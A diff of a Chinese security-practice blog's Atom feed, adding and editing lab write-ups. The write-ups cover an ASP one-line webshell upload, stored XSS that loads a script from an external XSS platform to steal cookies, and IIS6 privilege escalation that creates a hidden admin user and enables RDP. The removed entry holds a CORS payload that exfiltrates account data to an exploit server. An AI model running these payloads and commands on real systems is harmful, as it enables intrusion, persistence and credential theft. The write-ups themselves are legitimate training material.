@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-20T04:30:21.872Z</updated>
+  <updated>2019-12-20T07:00:51.775Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,11 +17,40 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>靶机第六题</title>
+    <link href="http://yoursite.com/2019/12/22/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98/"/>
+    <id>http://yoursite.com/2019/12/22/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98/</id>
+    <published>2019-12-22T06:35:37.000Z</published>
+    <updated>2019-12-20T07:00:51.775Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="靶机第六题"><a href="#靶机第六题" class="headerlink" title="靶机第六题"></a>靶机第六题</h2><p>前面已经提到了 我们已经菜刀进去了，结果发现C盘没有权限进去</p><p>那么cmd就没有用，因为cmd在C盘</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户失败.png" alt=""></p><p>于是我们上传了一个CMD.EXE文件</p><p>然后重新进入</p><p><code>net user 123 123 /add</code></p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户还失败.png" alt=""></p><p>于是再上传了一个IIS6.EXE</p><p><code>iis6.exe &quot;net user 123 123 /add&quot;</code></p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加用户成功.png" alt=""></p><p>上图告诉我们增加用户123 成功</p><p>然后查看一下用户权限</p><p><code>iis6.exe &quot;net user 123&quot;</code></p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看权限.png" alt=""></p><p>上图反应了我们的123用户还是普通用户，我们需要给予管理员权限</p><p><code>iis6.exe  &quot;net localgroup administrators 123 /add&quot;</code></p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 增加权限.png" alt=""></p><p>现在我们看看端口，看看服务，这个计算机开了一些什么在跑</p><p><code>iis6.exe  &quot;tasklist -svc&quot;</code></p><p><code>iis6.exe  &quot;netstat -ano&quot;</code></p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看服务.png" alt=""></p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 查看端口.png" alt=""></p><p>发现开了远程，假如没开，我们就帮他开，代码在后面</p><p>我们直接连接远程</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第六题 远程界面.png" alt=""></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><h4 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h4><h5 id="新建隐藏用户"><a href="#新建隐藏用户" class="headerlink" title="新建隐藏用户"></a>新建隐藏用户</h5><p>net user liuwx$ 123456 /add<br>net localgroup administrators liuwx$ /add</p><h5 id="如何查看隐藏用户"><a href="#如何查看隐藏用户" class="headerlink" title="如何查看隐藏用户"></a>如何查看隐藏用户</h5><p>regedit打开注册表<br>可以看到，在HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下有我们所有的用户名</p><h5 id="设置远程桌面端口"><a href="#设置远程桌面端口" class="headerlink" title="设置远程桌面端口"></a>设置远程桌面端口</h5><p>reg add “HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /t REG_DWORD /v portnumber /d 3389 /f </p><h5 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h5><p>wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 1 </p><h1 id="检查端口状态"><a href="#检查端口状态" class="headerlink" title="检查端口状态"></a>检查端口状态</h1><p>netstat -an|find “3389” </p><h1 id="关闭远程桌面"><a href="#关闭远程桌面" class="headerlink" title="关闭远程桌面"></a>关闭远程桌面</h1><p>wmic RDTOGGLE WHERE ServerName=’%COMPUTERNAME%’ call SetAllowTSConnections 0</p><h5 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h5><p>net user username password /add #添加用户<br>net user 123 123 /add<br>net user username #查看用户的详情<br>net user 123<br>net localgroup group username /add #将用户添加到group中<br>net localgroup administrators 123 /add</p><h5 id="方法一：开启3389端口。"><a href="#方法一：开启3389端口。" class="headerlink" title="方法一：开启3389端口。"></a>方法一：开启3389端口。</h5><p>echo Windows Registry Editor Version 5.00&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg<br>echo “fDenyTSConnections”=dword:00000000&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg<br>echo “PortNumber”=dword:00000d3d&gt;&gt;3389.reg<br>regedit /s 3389.reg<br>del 3389.reg</p><p>将以上内容拷贝到文本文档内，将后缀名改为.bat格式，双击运行，即可开启3389端口。</p><h5 id="方法二：开启和关闭3389端口"><a href="#方法二：开启和关闭3389端口" class="headerlink" title="方法二：开启和关闭3389端口"></a>方法二：开启和关闭3389端口</h5><p>1）开启3389端口：</p><p>在cmd内，执行如下命令，即可开启3389端口。</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p><p>2）关闭3389端口：</p><p>在cmd内，执行如下命令，即可关闭3389端口。</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;靶机第六题&quot;&gt;&lt;a href=&quot;#靶机第六题&quot; class=&quot;headerlink&quot; title=&quot;靶机第六题&quot;&gt;&lt;/a&gt;靶机第六题&lt;/h2&gt;&lt;p&gt;前面已经提到了 我们已经菜刀进去了，结果发现C盘没有权限进去&lt;/p&gt;
+&lt;p&gt;那么cmd就没有用，因为cmd在C盘&lt;/
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
     <title>靶机第五题</title>
-    <link href="http://yoursite.com/2019/12/20/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98/"/>
-    <id>http://yoursite.com/2019/12/20/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98/</id>
-    <published>2019-12-20T08:41:37.000Z</published>
-    <updated>2019-12-20T04:30:21.872Z</updated>
+    <link href="http://yoursite.com/2019/12/21/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98/"/>
+    <id>http://yoursite.com/2019/12/21/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98/</id>
+    <published>2019-12-21T08:41:37.000Z</published>
+    <updated>2019-12-20T07:00:08.165Z</updated>
     
     <content type="html"><![CDATA[<h2 id="靶机第五题"><a href="#靶机第五题" class="headerlink" title="靶机第五题"></a>靶机第五题</h2><p>先用第四题中获得的cookie进入</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 修改cookie.png" alt="cookie进入"></p><p>进入后台管理系统，然后先逛一逛，看看有没有可以上传图片或者文件的地方</p><p>然后发现了好几个上传图片的地方，上传一个PHP看看</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 上传木马.png" alt=""></p><p>跳转到我们的结果</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 上传木马2.png" alt=""></p><p>结果php文件不能被上传，于是我们按着上面给的限制来，于是上传图片马</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 上传图片马.png" alt=""></p><p><code>&lt;%eval request (&quot;pass&quot;)%&gt;</code></p><p>然后用菜刀进入</p><p>返回了一个失败的弹窗</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 菜刀进入失败.png" alt=""></p><p>404  然后IIS6.0</p><p>于是我们选择上传cer文件</p><p>菜刀进入</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第五题 发现flag.png" alt=""></p>]]></content>
     
@@ -47,10 +76,10 @@
   
   <entry>
     <title>靶机第四题</title>
-    <link href="http://yoursite.com/2019/12/19/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%9B%9B%E9%A2%98/"/>
-    <id>http://yoursite.com/2019/12/19/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%9B%9B%E9%A2%98/</id>
-    <published>2019-12-19T08:35:57.000Z</published>
-    <updated>2019-12-19T09:03:24.171Z</updated>
+    <link href="http://yoursite.com/2019/12/20/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%9B%9B%E9%A2%98/"/>
+    <id>http://yoursite.com/2019/12/20/%E9%9D%B6%E6%9C%BA%E7%AC%AC%E5%9B%9B%E9%A2%98/</id>
+    <published>2019-12-20T08:35:57.000Z</published>
+    <updated>2019-12-20T07:00:00.742Z</updated>
     
     <content type="html"><![CDATA[<h2 id="靶机第四题"><a href="#靶机第四题" class="headerlink" title="靶机第四题"></a>靶机第四题</h2><h3 id="发现进去就是一个留言板"><a href="#发现进去就是一个留言板" class="headerlink" title="发现进去就是一个留言板"></a>发现进去就是一个留言板</h3><p>留言板一般和XSS有关，但是不知道是什么限制，可能是字符限制</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 留言板测试.png" alt=""></p><p>对其进行测试发现，没有对字符进行限制</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 留言板发现有xss.png" alt=""></p><p>弹出了我们想要的提醒</p><p>这个时候我们需要一个XSS平台，进行渗透</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 xss平台.png" alt=""></p><p>这个平台可以给我们一个地址，然后渗透结果回返回</p><p>图片探针（记录referer，IP，浏览器等信息）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xsspt.com&#x2F;zEtYPN.jpg</span></pre></td></tr></table></figure><p>将如下代码植入怀疑出现xss的地方（注意’的转义），即可在<a href="http://xsspt.com/index.php?do=project&amp;act=view&amp;id=57267" target="_blank" rel="noopener">项目内容</a>观看XSS效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;script src &#x3D; http：&#x2F;&#x2F;xsspt.com&#x2F;zEtYPN&gt; &lt;&#x2F; script&gt;</span></pre></td></tr></table></figure><p>或者以你任何想要的方式插入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xsspt.com&#x2F;zEtYPN</span></pre></td></tr></table></figure><p>XSS返回了我们想要的结果</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 XSS平台结果.png" alt=""></p><p>注 一个小技巧</p><p><img src="http://q20wi1s2d.bkt.clouddn.com/靶机 第四题 小技巧.png" alt=""></p><p>这里有一个小技巧，可以发现XSS到底有没有运行</p>]]></content>
     
@@ -561,32 +590,6 @@
       <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
       <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CORS</title>
-    <link href="http://yoursite.com/2019/12/04/CORS/"/>
-    <id>http://yoursite.com/2019/12/04/CORS/</id>
-    <published>2019-12-04T06:20:20.000Z</published>
-    <updated>2019-12-04T06:21:45.789Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="关于Burp-Suite-的CORS-origin-null-的渗透"><a href="#关于Burp-Suite-的CORS-origin-null-的渗透" class="headerlink" title="关于Burp Suite 的CORS   origin:null 的渗透"></a>关于Burp Suite 的CORS   origin:null 的渗透</h3><p><strong>1.实验 登录你的账号密码</strong><br><img src="en-resource://database/6040:1" alt="ab391dd7015c2da12e84799da11985bb.png"><br><strong>2.用Burp Suite 拦截请求报文</strong><br><img src="en-resource://database/6042:1" alt="b1563c3125c4a6057201f51d5c5bf447.png"><br><strong>3.使用  漏洞利用服务器  并替换实验的URL</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox&#x3D;&quot;allow-scripts allow-top-navigation allow-forms&quot; src&#x3D;&quot;data:text&#x2F;html, &lt;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">var req &#x3D; new XMLHttpRequest ();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">req.onload &#x3D; reqListener;   req.open(&#39;get&#39;,&#39;$url&#x2F;accountDetails&#39;,true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">req.withCredentials &#x3D; true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">req.send();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">function reqListener()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123;       </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">location&#x3D;&#39;$exploit-server-url&#x2F;log?key&#x3D;&#39;+encodeURIComponent(this.responseText);   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span></pre></td></tr></table></figure><br><strong>4.进行测试</strong></p><p>用您的特定实验室的URL 替换$ url，用漏洞利用服务器的URL 替换$ exploit-server-url，然后单击“查看漏洞”对其进行测试</p><p><img src="en-resource://database/6044:1" alt="538a842cac20cf877357ff83652638a1.png"><br>看见日志  进行分析<br>发现了<br>wiener的APT密码</p><p>administrator的APT密码</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;关于Burp-Suite-的CORS-origin-null-的渗透&quot;&gt;&lt;a href=&quot;#关于Burp-Suite-的CORS-origin-null-的渗透&quot; class=&quot;headerlink&quot; title=&quot;关于Burp Suite 的CORS   ori
-      
-    
-    </summary>
-    
-    
-      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="burp" scheme="http://yoursite.com/tags/burp/"/>
     
   </entry>
   
